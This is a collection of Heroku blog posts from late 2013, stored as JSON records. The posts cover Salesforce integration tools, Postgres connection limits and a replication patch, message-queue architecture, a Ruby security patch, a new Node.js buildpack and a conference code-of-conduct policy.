{"website": "Heroku", "title": "Tools for integrating Heroku apps with Salesforce.com", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/tools-for-integrating-heroku-apps-with-salesforce", "abstract": "Tools for integrating Heroku apps with Salesforce.com Posted by Matthew Soldo November 19, 2013 Listen to this article At our core, Heroku's goal is to make it easier for developers to build great apps. We do this by creating tools which allow developers to focus on writing code, rather than wasting time on managing infrastructure. To coincide with this week's Dreamforce event , we are launching several tools targeted at developers who write apps on Heroku that integrate with Salesforce.com. If you aren't part of the Salesforce world, don't worry. We remain 100% committed to our core audience of web and mobile developers and will continue to release great new features and functionality like websockets and high-availability databases . Force.com, a full stack platform for building employee-facing apps, provides a RESTful interface into Salesforce's sales, support, and marketing SaaS products. The three tools that we are launching today make it easier and more productive to build and connect to apps using Force.com. They are a Force.com CLI, Force.com Client Libraries for ruby and node.js, and Heroku Connect. Force.com CLI Previously, building Force.com apps required logging into Salesforce.com's web interface. But for developers who live on the command line, this can break flow. So we created the Force.com CLI . It allows you to interact directly with the data in Salesforce, in a lightweight and unobtrusive fashion: $ force login matt@heroku.com View the record types available: $ force sobject list\nAccount\nCampaign\nContact\nEvent\nGroup\nLead\nOpportunity\nTask See information about a record type: $ force field list Contact\nAccountId: reference (Account)\nAssistantName: string\nAssistantPhone: phone\nBirthdate: date\nFirstName: string\nLastName: string Run a SOQL query: $ force select id, name from user\n\n Id                 | Name          \n--------------------+---------------\n 005i0000002DYYQBB4 | Bob Smith \n--------------------+---------------\n (1 records) The Force CLI is open source and is available to download now . Force.com Client Libraries In addition to the CLI tool, we are releasing Force.com Client Libraries for Ruby and Node.js . These libraries are based on existing open source efforts and are available on github . Install the force.com ruby gem : $ gem install force ... or the Node.js library : $ npm install force Documentation on using the libraries is available on their Github pages. Introducing Heroku Connect Our final announcement for Dreamforce is Heroku Connect. It syncs data from Salesforce into Heroku Postgres automatically, handling many of the common issues of using an API such as local caching and conflict resolution. Because many application frameworks are optimized for using an SQL database (Rails, Django, etc), this makes it incredibly fast and easy to build apps that connect with Salesforce. Heroku Connect is available as part of our Heroku1 edition and is in limited availability now. It be generally available in the first half of 2014. If you are interested in becoming and early customer, sign up here . Come see us at Dreamforce If you would like to learn more about Heroku1 or the Force.com tools, please visit us at Dreamforce this week. Herokai (Heroku employees) are stationed on the second floor of Moscone West at the Heroku Demo Station, Connected Devices Lab, and at the Hackathon.", "date": "2013-11-19,"},
{"website": "Heroku", "title": "Powering the Internet of Customers with Heroku1", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/powering_the_internet_of_customers_with_heroku1", "abstract": "Powering the Internet of Customers with Heroku1 Posted by Matthew Soldo November 20, 2013 Listen to this article Editor's Note: We are cross-posting this article from the Salesforce Blog . It shows how we are bringing Heroku to a new market and audience - Salesforce customers - using a new product and message. If you are a user of both Heroku and Salesforce and are interested in connecting them, check out Heroku1 . Apps are an essential part of the Internet of Customers. They are the dashboards to people’s lives. They allow your customers to be part of your business’ workflows, and for you to engage with them on an unprecedented level. Customer connected apps are the next phase of how companies are innovating and gaining competitive advantage. Today, we are launching Heroku1, a complete service for building and scaling the next generation of customer connected apps. Heroku1 is purpose-built for the Salesforce1 platform . It is a new, fully-loaded edition of Heroku’s Platform-as-a-Service designed specifically for building apps that are fully integrated with your Salesforce data. Because it leverages your existing investment in Salesforce.com, it’s now faster and easier than ever to build web, mobile, and connected-device apps that will delight your customers. Heroku1 solves the three biggest problems that enterprises face in building connected applications: Connected data : Too many web and mobile applications are islands, and don’t connect with core customer and operational information. Speed to market : Managing infrastructure and using clumsy tools makes it hard to get apps to market fast. Ongoing operations : The hardest part of having successful apps isn’t building them, it is managing them. Heroku is already used by thousands of startups and cutting-edge enterprises. It runs some of the largest and most innovative apps on the Internet, including Paper by FiftyThree , Automatic , Urban Dictionary , Lyft , and Asics . Heroku1 makes the power of Heroku available to companies that have embraced the Salesforce1 Platform. Customers Apps Done Right with Heroku Connect The cornerstone of Heroku1 is the new Heroku Connect technology, which leverages your Salesforce investment by giving your developers a simple and efficient way to connect all your customer-facing Heroku apps to your Salesforce environment. Heroku Connect: Automatically synchronizes your Heroku Postgres database with your customer and operational data in Salesforce. Provides your Force.com data in a SQL database, which is compatible with all leading web and mobile app dev environments, such as Ruby, Java, Node.js and PHP. Seamlessly scales to handle even the most demanding traffic levels. Now your customer-facing apps can be responsive to your business workflows. For example, your marketing team can prepare offers within Salesforce and have those offers automatically presented to customers inside your app. And the connection is two-way, so data that your customer’s provide by using your app is synced back to Salesforce records automatically, making it easy to take actions and create dashboards based on how your customers use your app. Better Apps with the Cloud Heroku1 lets your software developers focus on building great experiences for your customers, not on managing infrastructure. Heroku1 removes the need to requisition, setup, and manage servers. This allows developers to focus on what they do best: Delivering better apps faster. Heroku1 supports the most popular programming languages in use today, including Java, Ruby, Node.js, PHP, and Python. This means developers can choose the best tool for the job, delivering better software faster. Sleep at Night, While we Manage Ongoing Operations You know that launching an app is just the first step. After it’s live, you need to scale, monitor, and operate it. Heroku1 is a platform as a service, so app operations are built-in. We have a team of engineers who monitor your app to keep it up and running smoothly. Security updates and patches are handled automatically. And scaling is as simple as a single click to provision more resources. Innovate with Heroku1 Are you ready to innovate? Heroku1 is in limited availability today to charter customers, and will be generally available in the first half of 2014. If you want to learn more about Heroku1, apply to be a charter customer, or be notified when it is generally available, please visit www.heroku.com/1 .", "date": "2013-11-20,"},
{"website": "Heroku", "title": "Connection Limit Guidance", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/connection_limit_guidance", "abstract": "Connection Limit Guidance Posted by Craig Kerstiens November 22, 2013 Listen to this article Many of our customers have recently asked about our connection limit settings on our new Heroku Postgres tiers. Previously we allowed for 500 connections across all production databases, however now there is some variance in the number of connections allowed with only the larger plans offering 500. In individual conversations with customers we’ve detailed the reasoning behind this, and feel its worth sharing this more broadly here now. For some initial background, our connection limit updates are actually aimed to be an improvement for anyone running a Heroku Postgres database, by both providing some guidelines as well as setting some expectations around what a database instance is capable of. What we’ve observed from running the largest fleet of Postgres in the world (over 750k databases) and heavily engaging with the Postgres community is there are two actual physical considerations in Postgres itself when it comes to the number of connections. Setting a high limit has performance impact under normal operations, even without establishing all available slots. The situation worsens when many connections are established, even if they’re mostly idle. By setting extremely high limits, when you encounter an issue it is masked by a much more vague error, thus making troubleshooting more painful. The first limitation of PostgreSQL itself is that it doesn’t scale to a large number of connections. The Postgres community and large users of Postgres do not encourage running at anywhere close to 500 connections or above. To get a bit more technical, the size of various data structures in postgres, such as the lock table and the procarray, are proportional to the max number of connections. These structures must be scanned by Postgres frequently. The second limitation is that each connection is essentially a process fork with a resident memory allocation of roughly 10 MB, along with some query load. We give some slack to this in our 60 connection limit on Yanari and a memory size of 400 MB. The previous experience was that as a user when your connections increased you would start receiving \"out of memory” errors within Postgres. These “out of memory” errors can occur for any number of reasons, and having too many connections are just one cause, but by far the most common one. Instead of forcing you to evaluate all possible causes of the error, we want to make it clearer and simpler when you hit a limitation around connections. Now when you hit our connection limit you’ll receive an alert with clear guidance on these details so that you may reduce your connection usage or scale up to a larger instance. At the same time, we understand that you may want to have a total of more than 500 connections to your database for any number of valid reasons. When that many processes need access to the database, a production grade connection pooler is the correct approach. For that reason, a Heroku Postgres staff member created the pgbouncer build pack , which places what's considered the best Postgres connection pooler right on your dynos. We’re continuing to productize that further though happy to work with customers today if they’ve run into that limitation. Our goal with these new connection limits are to make it easier for you to do the right thing for your database. As always we welcome your feedback around this or other product areas at postgres@heroku.com . postgres", "date": "2013-11-22,"},
{"website": "Heroku", "title": "Message Queues, Background Processing and the End of the Monolithic App", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/end_monolithic_app", "abstract": "Message Queues, Background Processing and the End of the Monolithic App Posted by Sara Dornsife December 03, 2013 Listen to this article Editor's note: This is a guest post from Ken Fromm and Paddy Foran at Iron.io . Iron.io's services are designed for building distributed cloud applications quickly and operating at scale. Platform as a Service has transformed the use of cloud infrastructure and drastically increased cloud adoption for common types of applications, but apps are becoming more complex. There are more interfaces, greater expectations on response times, increasing connections to other systems, and lots more processing around each event. The next shift in cloud development will be less about building monolithic apps and more about creating highly scalable and adaptive systems. Don’t get us wrong, developers are not going to go around calling themselves systems engineers any time soon but at the scale and capabilities that the cloud enables, the title is not too far from the truth. Platforms as Foundation It makes sense that platforms are great for framework-suited tasks – receiving requests and responding to them – but as the web evolves, more complex architectures are called for, and these architectures haven’t yet evolved in an equivalent manner as all encompassing framework-centered applications. By way of example, apps are rapidly evolving away from a synchronous request/response model towards a more asynchronous/evented model. The reason is because users are demanding faster response times and more immediate data. Also, more actions are being triggered by each event. Rather than thinking of the request and response as the lifecycle of your application, many developers are thinking of each request loop as just another set of input/output opportunities. Your application is always-on, and by building your architecture to support events and process responses asynchronously and highly concurrently, you can increase throughput and reduce operational complexity and rigidity substantially. Building N-Tier Applications The traditional framework-centered application is a two-tier application. You have an application tier, which runs your application’s software, and then you have your database servers, which store your data. At some point, you might start adding background processing that hands off of your application tier. Cloud applications, however, are quickly moving away from this traditional two-tier architecture that then starts growing organically out of need towards a proper n-tier architecture at the onset. These additional tiers – the specialised components that help an application escape the request/response loop – provide alternative computing, storage, and process orchestration to handle the growing set of response needs. Independent processing components operation in the background, for example, might make use of these resources to perform specific actions – resizing images, sending emails and notifications, creating a bridge or buffer between processes, or doing any sort of variable-length processing. Message queues often form the backbone to help orchestration these event actions. They have usually been introduced after the first generation architecture when an app needs to expand and scale. In brief, they provide asynchronicity, task dispatch, event buffering, and process separation. But they are such basic components – the High Scalability blog likens them to an arch or beam in building design – that they should be built into architectures from the start. Incorporating additional computing resources into your IT stack ensures you not only have immediate scalability at hand but also a robust mesh of response services that communicate over loose APIs. This allows you to swap out, modify, or upgrade individual processes and computing modules at will – even while your application is running – without affecting other components. Decoupling Your Application Once you decide to move away from a monolithic application to an n-tiered one, the process of actually converting the application can be as gradual or as abrupt as you like. Because each piece speaks its own informal API, and doesn’t care about the other pieces, it makes no difference whether you overhaul your application all at once, or slowly transition it piecemeal. The general rule of thumb for determining whether a piece of functionality should be broken out of the main application is “Is it absolutely necessary that the user wait for this action to be completed before we can give them a response?” Things like resizing images, scraping web pages, and interacting with APIs take a long, sometimes variable, amount of time, so you shouldn’t make the user wait for them. They’re good candidates for being broken out into their own processing elements. Once you’ve identified these elements, then reduce them to reusable pieces but have them operate independent of any other pieces. Right from the start you’ll want to loosely connect these “services” using message queues and worker systems. The benefit is each service will be independent of any other processes and so they can more easily change and adapt without adversely impacting other parts of the system. Events can be routed to multiple message queues so that additional actions can easily and transparently be added to specific events. Message queues also create buffers so that differences in processing throughput among the components can be handled efficiently and allowing each worker class to be scaled out independently. Breaking things down into components will depend on the specific functionality, but there are a few tools you can use: Workers Workers provide the muscle in these distributed systems; they are the processing power that actually gets things done. Workers generally provide for custom-built environments that only survive for the duration of the task – whatever work needs to be done, like resizing a single picture. Then the environment is destroyed, and rebuilt for the next task. The benefit of workers are their flexibility; because they’re highly reproducible and self-contained, workers can be scaled effortlessly to meet demand. The weakness of workers that needs to be architected around is their startup costs; because each task requires a new environment to be built, it can be expensive to set up complex environments. To work around this, we recommend batching tasks into groups that can be performed in the same environment. The other thing customers usually need to wrap their heads around is that tasks don’t get executed immediately – they’re things that will happen at some point in the future. While there are some user-visible actions that it’s okay to offload to workers – forking GitHub repos, for example, happens in a worker – generally you want to keep actions that the user specifically requests in the request/response loop. → IronWorker , Heroku Worker Dynos , Celery , and Sidekiq are good options to look at for building workers into your architecture. Message Queues Message queues are the bonds that tie distributed architectures together. They’re used to transmit data between the component parts of the architecture. The general concept is that chunks of data (messages) are put into a group (a queue) then removed from that group in a predefined order, either FIFO (first in first out) or FILO (first in last out). Message queues generally come in two flavours: pull queues and push queues. Pull queues are queues that ask clients to periodically check for messages on a queue. If a message is found, the queue will give it to the client and remove it from the queue. If a message is not found, the client just tries again after a set period of time. Pull queues are great for data flows that are heavy or consistent, because there’s a high chance that the request will yield a message, not a waste of bandwidth and processing power, but the queue won’t bring down the client by delivering more messages than the client can handle. Push queues are queues that inform subscribers when a message is added to the queue. This means that data is processed more promptly, because subscribers know about it immediately, but it also means that the queue and client have to do more work, sending and receiving the data. Push queues are great for data flows that are sporadic, because the data comes infrequently. Knowing about the data as soon as it comes is worth the tradeoff of the minimal increase in extra processing. → IronMQ , Beanstalkd , and RabbitMQ are good options for message queues that will connect your architectures. For more information on uses of a message queue, check out this post on Top 10 Uses of a Message Queue . Key-Value Datastores Key-value datastores are the simple memory and counters behind distributed systems. They’re used to store and index the data that workers create or need. The difference between a key-value datastore and a queue is that queue data is tied to a specific task – it’s meant to be processed once, then forgotten. Key-value data typically lives outside of the task lifecycle – it can be shared between many tasks and survive after processing. This is useful for storing results or communicating shared information that is not task-specific. The benefit of caches is that they provide an easy, predictable interface for accessing and storing data. The drawback is that not all caches are concurrency-safe, so it’s possible to corrupt data if two or more clients are trying to write to the same key at the same time. This can be architected around by generating IDs that will only be used by a single client, but it’s something to keep in mind. → IronCache , Memcached , and Redis are good options for datastores that will keep your data handy and safe while you process it or share data between tasks. The Right Tools | The Right Services The large marketplace of cloud applications that have integrated with Heroku as add-ons are indispensable tools in this kind of architecture.  These single-minded components require no standup or provisioning, and they also require no maintenance from the developer. They just work. Besides the peace of mind this buys – which, in its own right, is worth it – this specialization allows the services to be specialised and feature-rich, moreso than if they were all implemented by the developer. Orthogonal, flexible components are hard to make, and diluting a developer’s attention with the plumbing will detract from their application – the thing they actually care about making. At Iron.io, we’re big fans of using elastic cloud services as components. Our mindset from the beginning as early cloud developers has been to use service components wherever possible, so as to focus on our core competencies. It’s probably not surprising that we ended up making cloud services for other developers to use. Start breaking your monolithic apps into their composite pieces today. You’ll be glad you did. And if you need help, read more about loose-coupled architectures and strategies on the Iron.io blog or check-in with us at the Iron.io chatroom . Our engineering team is always happy to talk about scalable architectures.", "date": "2013-12-03,"},
{"website": "Heroku", "title": "Heroku Postgres Followers Patched", "author": ["Harold Giménez"], "link": "https://blog.heroku.com/heroku_postgres_followers_patched", "abstract": "Heroku Postgres Followers Patched Posted by Harold Giménez November 27, 2013 Listen to this article On November 18th, a replication bug was found in Postgres that affected the most recent versions of every Postgres release. The corruption that this bug may introduce could go undetected, and it manifests itself as a follower potentially having an inconsistent view of the data. For example, data could be present in the primary and not on the follower, or data deleted or updated on the primary and not from the follower. The likelihood of triggering this bug is higher for write-heavy workloads, such as many OLTP applications seen at Heroku. We always recommend placing applications in maintenance mode and scaling down workers when performing a follower based changeover , and following this procedure largely decreases the chances of corruption introduced by this bug. At Heroku Postgres we recognize the importance of data integrity and consistency in your databases: As of now there are no Heroku Postgres databases vulnerable to this corruption bug. Even though new versions of Postgres have not been released yet and are scheduled to ship early December, a patch was made available to the Postgres community on all git branches for affected versions. We have back-ported this patch to all of our supported Postgres versions, and all affected instances have been replaced. As this bug only impacts followers, no primary databases were at risk and no primary databases required the patch. If you were worried about this bug affecting your Heroku Postgres database, worry no longer: just sit back and enjoy your healthy followers. postgres", "date": "2013-11-27,"},
{"website": "Heroku", "title": "Batkid Saves the Day in SF", "author": ["Abe Pursell"], "link": "https://blog.heroku.com/batkid_saves_the_day_in_sf", "abstract": "Batkid Saves the Day in SF Posted by Abe Pursell December 04, 2013 Listen to this article Editor's Note : This is a guest post from Jonathan Cipriano , creative developer based in San Francisco currently working as a Creative Research & Development Manager at AKQA. A few weeks back, the Make-a-Wish Foundation made a 5-year old cancer survivor named Miles dream come true by helping him play out a Batman-style adventure in San Francisco . The city was morphed into Gotham for a day with the help of 12,000 volunteers. A rescue mission turned the pint-sized crusader into a social media sensation. Miles became Batkid for a day. Inspired by his story, some creative devs at AKQA thought it would be fitting to memorialize the heroic event with an interactive comic book, thebatkid.com and created it on Heroku. The Batkid Lives On By using images of the #SFBatkid shared through Instagram, Twitter, Facebook and Flickr, our creative team chronicled Miles' adventure as he raced from rescue to rescue, saving the city from crime and earning himself a key to the city from Mayor Ed Lee himself. To best tell Miles’ digital story in a timely and seamless way, thebatkid.com needed to be designed and developed within a few days using a platform that could be easily managed without significant knowledge of server setup and configuration. Naturally, Heroku was an automatic choice. We have all of our source code on GitHub and we were able to deploy the site with custom DNS in literally minutes. With the Heroku CLI, deploying an application only takes 2-3 commands in the terminal. Node.js is becoming very popular with us for rapid prototyping. The learning curve is super low for front-end developers who already know javascript well. The availability of node modules also enables developers to get a running application in no time. For thebatkid.com we developed a small node.js application to aggregate all of the incoming Twitter photos that we would potentially use in the comic. Following the Getting Started with Node.js tutorial we had the express.js application developed and deployed within a few hours. What we ended up creating is something that is actually very simple technically speaking. However, from our experience, even simple projects can suffer if you can't get them live when you need it to. Heroku allowed us to get up and running quickly without the dev-ops overhead, so we could just concentrate on creating a cool comic book for Miles Scott (aka The Batkid). CREDITS Art Director: John Ta , Michael Dooley , Ben Pang Copywriter: Keith Hostert , Alex Gavin Developer: Mikko Tormala , Jonathan Cipriano", "date": "2013-12-04,"},
{"website": "Heroku", "title": "A Patch in Time: Securing Ruby", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/a_patch_in_time_securing_ruby", "abstract": "A Patch in Time: Securing Ruby Posted by Richard Schneeman December 05, 2013 Listen to this article There have been thousands of reported security vulnerabilities in 2013 alone, often with language that leaves it unclear if you're affected. Heroku's job is to ensure you can focus on building your functionality, as part of that we take responsibility for the security of your app as much as we're able. On Friday, November 22nd a security vulnerability was disclosed in Ruby (MRI): CVE-2013-4164 . Our team moved quickly to identify the risk to anyone using the Heroku platform and push out a fix. The vulnerability The disclosed Ruby vulnerability contains a denial-of-service vector with the possibility of arbitrary code execution as it involves a heap overflow . In a denial-of-service attack, a malicious individual sends your app requests that either causes the system to lock up or become unresponsive. When multiple people or systems do this, it becomes a distributed denial-of-service attack (or DDoS). A denial-of-service attack can vary in damage depending on how crucial uptime is to your app. For example if your app brings in a significant amount of money every hour, an attacker could cost you a large sum by bringing your service down. In this case, the denial-of-service was particularly easy to execute, making this a potentially devastating attack to some users. In addition, because this attack triggers a heap overflow, there is also a slim theoretical possibility of a much more serious vulnerability, an arbitrary code execution . We could not rule out the possibility of arbitrary code execution even though there is no known way to achieve it through this vulnerability. The fix When the vulnerability was announced, patched versions of Ruby 1.9.3, 2.0.0, and 2.1.0 were made available from Ruby core. Heroku’s Ruby Task Force pulled in the latest versions, compiled them and after running tests to confirm their compatibility with the platform released updated versions of 1.9.3, 2.0.0, and 2.1.0 . Any new pushes to the platform receive these patched versions. Some have asked why we didn’t automatically force-update all Ruby apps. First, Heroku will not re-deploy a user’s app without their direct knowledge or action. Additionally, since some upstream dependencies may have changed since an app’s last deploy, we also want to maintain erosion resistance by only changing components on an explicit push. In addition to building and deploying the fixed versions of Ruby, we: Released a Changelog entry . Sent out an email to all Ruby users. We also did something unprecedented in the history of Heroku: patched and released two unmaintained language versions, Ruby 1.8.7 and 1.9.2. Unmaintained Ruby versions The Ruby 1.8.7 version has been at the End of Life for months, which means that the Ruby Core team will no longer issue bug or security fixes for the language. However, developers are still using it actively in production. Ruby 1.9.2 is currently unmaintained , though this status has not been formally announced. While security patches were not made available for Ruby 1.8.7 and 1.9.2, Ruby engineer Terence Lee discovered that he could cleanly apply the security fix to both versions. The source for these are available on Heroku's fork of Ruby: 1.8.7p375 and 1.9.2p321 . He then built, tested, and released these versions on Heroku’s Cedar stack. Terence recently got commit access to Ruby core and is currently working on pushing the changes upstream even though the two versions are technically unmaintained. Terence’s actions give you a longer runway but developers using Ruby 1.8.7 or 1.9.2 must upgrade as soon as possible. Heroku recommends upgrading to Ruby 2.0.0 or at very minimum 1.9.3. Matz has stated that support for 1.9.3 will likely be dropped within a year. Heroku’s Bamboo stack runs Ruby Enterprise Edition which has been at end of life since early 2012 and was not patched. Bamboo users should upgrade to the Cedar stack to stay secure. Staying on a current version is crucial to being able to iterate quickly and respond to vulnerabilities. For example, the Chrome web browser auto updates in the background, and recently Apple software has moved their Mac and iOS app stores to this model. Using updated software provides benefits to a maintainer: less fragmentation and less time spent supporting legacy versions. This means more time for features, performance, and compatibility. The Rails web framework only supports Ruby 1.9.3+ for their 4.0.0 release, and it is rumored that they will be supporting only 2.0.0+ for their 4.1.0 release. Without dropping support for older syntaxes, developers cannot utilize new ones. As a language user, staying current means you have access to the latest features, latest security updates, and most active language support. For all these reasons, we want to encourage Heroku users to regularly upgrade and stay up-to-date. The ending of support for Ruby 1.8.7 and 1.9.2 are interesting events for Heroku: they represent the first time a technology used on the platform became unmaintained by its core developers. While we have extended the period you are secure on these unmaintained versions, we have not made a commitment to maintain either Ruby 1.8.7 or 1.9.2 indefinitely. We know that these environments are still in use, and want to make sure customers have ample time to upgrade. We’re working to make Heroku’s Ruby version support commitments and timelines explicit, and will publish documentation to that effect. Security Matters For Heroku’s security team, communication is as much a concern as technical fixes. When communication breaks down, so does security. This year we’ve seen several large vulnerabilities that required notifications for languages, frameworks and tools including a Postgres  patch and the Rails YAML vulnerability . We’re working on better ways to notify affected application owners. In this incident, we sent notifications to all Ruby application owners even if they were running JRuby or Rubinius, runtimes that were not affected. In the future we aim to be able to dial up our signal-to-noise ratio on security notifications, and even be able to provide app-specific information quickly and securely. If this sounds like fun, our Security team is hiring . If you’re using Ruby on the platform, be sure to take advantage of the fix as soon as possible. If you’re depending on an older, unmaintained version of Ruby, upgrade as soon as possible. If you’re maintaining your own versions of Ruby, make sure you update and re-compile. If you’re running on Heroku, sleep well knowing that we care about your security.", "date": "2013-12-05,"},
{"website": "Heroku", "title": "Announcing a new and improved Node.js Buildpack", "author": ["Zeke Sikelianos"], "link": "https://blog.heroku.com/new-node-buildpack", "abstract": "Announcing a new and improved Node.js Buildpack Posted by Zeke Sikelianos December 10, 2013 Listen to this article Last week we released a new version of our node buildpack that features dependency caching, faster downloads of the node binary, and support for any recent version of node. This new build process is now the default for all node apps on Heroku, so keep deploying your apps as you normally would and you should start to notice the speed improvements. Faster Deployments The new buildpack makes use of a build cache to store the node_modules directory between builds. This caching can mean dramatically reduced build times, particularly in cases where your modules include binary dependencies like pg , bson , or ws . We've also shaved time off the build process by caching precompiled node binaries on our own S3-backed proxy of nodejs.org/dist. Some observant users noticed the performance improvements right away: woah… @heroku ’s #NodeJS deployment went from a 5 minute ordeal down to about 30 seconds, and cut the slug size in half! nice. :) — derickbailey (@derickbailey) December 3, 2013 Build time for #nodejs on @heroku dropped from 2+ mins to like 10 seconds. Looks like @zeke is the guy responsible. A million thanks! — Venkat Malladi (@mvsastry) December 4, 2013 More Versions of Node Your apps can now run any recent version of Node.js on Heroku, including unstable pre-release versions. As of this writing, that includes all versions from 0.8.6 up to 0.11.9 . To automate the process of version discovery, we created semver.io , an open-source webservice that aggregates version information from nodejs.org/dist and makes it queryable by the buildpack. This eliminates the need for manual intervention each time a new version of node is released. To see what versions of node are currently available at any given time, visit semver.io or what-is-the-latest-version-of-node.com . This information is also available on Heroku's Dev Center . Custom Registry Support The public npm registry has seen immense growth in recent years, and with that has come occasional instability. As a result, many node users are seeking alternatives to the public registry, either for the sake of speed and stability in the development and build cycle, or as a means to host private node modules. As of today, you can include a .npmrc file in the root directory of your node app and the new buildpack will honor it when running npm install . The .npmrc file lets you configure npm to download modules from your own private registry , a European mirror , or otherwise . A Cleaner Codebase Clean, commented code is key to the success of any open-source project. A tidy codebase lowers the barrier to understanding, and increases the likelyhood of useful community contributions. With nearly 600 forks on GitHub, clean code is of paramount importance to the buildpack's future success and adoption. The new buildpack has a lighter footprint, fewer dependencies, and lots of comments . Product Feedback About 3 months ago, we announced the beta version of the buildpack on the new Heroku Discussion Forum , asking node developers to try the new buildpack and give feedback. The forum proved to be a great tool for collecting insight from users, and soliciting feedback in a public forum meant fewer redundant bug reports and feature requests from users. The beta period is now over, but we'd still love to hear your thoughts. If you're having issues that are specific to your app, file a support ticket at help.heroku.com . If you'd like to discuss node development in general, start a thread on discussion.heroku.com . If you have build issues or ideas that are not specific to your app(s), create a GitHub issue . Thank You Thanks to all the brave hackers who tested the new buildpack on their apps, found bugs, provided useful feedback, and submitted pull requests. Here's to the future of Node.js!", "date": "2013-12-10,"},
{"website": "Heroku", "title": "Why Heroku Adopted a Code of Conduct Policy and Sponsored The Ada Initiative", "author": ["Sara Dornsife"], "link": "https://blog.heroku.com/code_of_conduct", "abstract": "Why Heroku Adopted a Code of Conduct Policy and Sponsored The Ada Initiative Posted by Sara Dornsife December 10, 2013 Listen to this article Editor's note: This is a guest post from Rikki Endsley . Rikki Endsley is a technology journalist and the USENIX Association's community manager. In the past, she worked as the associate publisher of Linux Pro Magazine, ADMIN, and Ubuntu User, and as the managing editor of Sys Admin magazine. Find her online at rikkiendsley.com and @rikkiends on Twitter. A code of conduct is a signal to attendees that conference organizers have carefully considered the issues involved with attending events, and that they want to make their conference welcoming and safe for everyone. Heroku recently adopted an event sponsorship policy that shows that the company recognizes the importance of formal codes of conduct. By announcing its new code of conduct policy, Heroku plans to help cultivate a more inviting and diverse community. Sara Dornsife, Director of Developer Marketing at Heroku, says that before agreeing to sponsor an event, the company will verify that the conference has a code of conduct in place. “If they do not, we will introduce them to the Ada Initiative so that they can get help to adopt one. If they refuse to adopt one, we will not sponsor.” Events Should Be Fun and Informative Sara runs the events team at Heroku, which organizes, sponsors, attends, and sends speakers to a range of tech events each year. Recently she worked on developing a code of conduct policy with Heroku colleagues — Shanley Kane , Jacob Kaplan-Moss , Matt Zimmerman , and Dominic Dagradi . The Heroku team decided to work with the Ada Initiative to develop the new policy . “I have been really impressed with Ada,” Sara says. “They have taken it on themselves to create clear and fair codes of conduct for conferences and to work with organizers to adopt them.” Matt Zimmerman, Vice President of Engineering at Heroku (and former member of The Ada Initiative board of directors and former advisory board member), says that working on the Heroku code of conduct policy provided an opportunity to connect his personal passion with his work. Following PyCon's Lead Jacob Kaplan-Moss, Django web framework co-founder and a core contributor, joined Heroku in May 2013 as the Director of Security. In November 2013, he also joined the Ada Initiative advisory board . Although Jacob's role on the advisory board is new, his support for the Ada Initiative is not. In fact, in August 2013, Jacob called on the Python community to raise $10,000 to help support the non-profit , and he ponied up $5,000 in matching funds. The Python community accepted the challenge and chipped in the initial $5,000 in only 27 hours. Jacob isn't new to the idea of adopting a code of conduct policy for events, either. Back in August 2011, Jacob announced a new personal code of conduct policy for attending and speaking at tech conferences. “I’m proud that PyCon , the conference I help organize, has adopted and published our own code of conduct .” According to Jacob, PyCon adopted a code of conduct in 2011. Back then, women made up about 1-2% of attendees, whereas the 2013 event included approximately 20% women. Although the code of conduct policy isn't 100% responsible for the increase in participation by women, Jacob says it's a vital part in making community events safer for all attendees. With his PyCon experience in mind, Jacob was eager to help Heroku adopt a code of conduct policy. “Heroku supports a lot of developer events,” he says, “And I think as a company, we have similar concerns to those I have as an individual and organizer. We want to be involved with events that attract and support as wide a range of attendees as possible, and we want the events we support to be safe and fun for everyone.” Jacob jumped at the chance to help get Heroku involved in promoting and support codes of conduct as 'table stakes' for a tech conference. “A code of conduct sends a strong message that inappropriate behavior will be taken seriously, and that victims will be treated with respect. Codes of conduct aren't the end of the things we can — and should — do to help make our communities more welcoming and diverse, but they're an easy, powerful first step in the right direction.” “Although a code of conduct is quickly becoming table stakes for modern programming conferences, every action, no matter how small, that supports and reinforces equality and accessibility is an important step toward an all-around healthier community,” says Dominic Dagradi, an engineer on the Web Apps team at Heroku. Helping to Foster Change With The Ada Initiative Heroku has thrown additional support behind the Ada Initiative efforts by contributing $10,000 and becoming a corporate sponsor. “The great part about sponsorships like Heroku's is that they let us do higher-impact projects that take longer to plan and serve women around the world,” says Valerie Aurora, co-founder and Executive Director of the Ada Initiative . For example, the Ada Initiative plans to host several international AdaCamps in 2014. “At each AdaCamp, we spend a significant part of our budget on travel scholarships to give women that initial leg up in open tech/culture that makes such a difference to whether women stay or drop out,” Valerie says. “However, we always get more excellent applications than we have travel scholarships, and sometimes people can't get the necessary visas even when they get the scholarship.” She says that most AdaCamp sponsors are more likely to sponsor a local conference near where their employees work. “When companies like Heroku sponsor the entire Ada Initiative, it makes it much easier for us to do long-term international outreach like this.” Contributions like Heroku's corporate sponsorship also help fund the Ada Initiative's on-going work reducing harassment and increasing the diversity of speakers and attendees at conferences. Three years after its founding, The Ada Initiative is making a major impact in open tech/culture companies, Valerie says. “A crucial part of its success is that the Ada Initiative provides support and advice to conference organizers and sponsors one-on-one, through phone calls, emails, and in-person meetings. We answer questions about training staff, give advice on travel scholarship programs, review conference materials to make them more welcoming, and much more. Without this immediate support and advice, many conference organizers would not have made these changes, which is one reason why earlier similar projects using volunteer effort fizzled out. And without sponsorship, we wouldn't be able to provide this kind of professional expert support.” Heroku supports a range of tech organizations and events, but before asking the company to sponsor your tech conference, make sure you meet their new requirement.  “If you are interested in Heroku sponsoring your event, make sure you have a code of conduct in place,” says Sara Dornsife. “If you do not have a code of conduct, the Ada Initiative can help. If you refuse to adopt a code of conduct policy, we will not be sponsoring your event.” You can find Heroku's Conference and Event Policy and code of conduct here . Contact Us If you have a code of conduct in place and want information about Heroku event sponsorships, contact events@heroku.com . If you need help with creating your event's code of conduct policy, or to contribute to the Ada Initiative, visit: https://adainitiative.org .", "date": "2013-12-10,"},
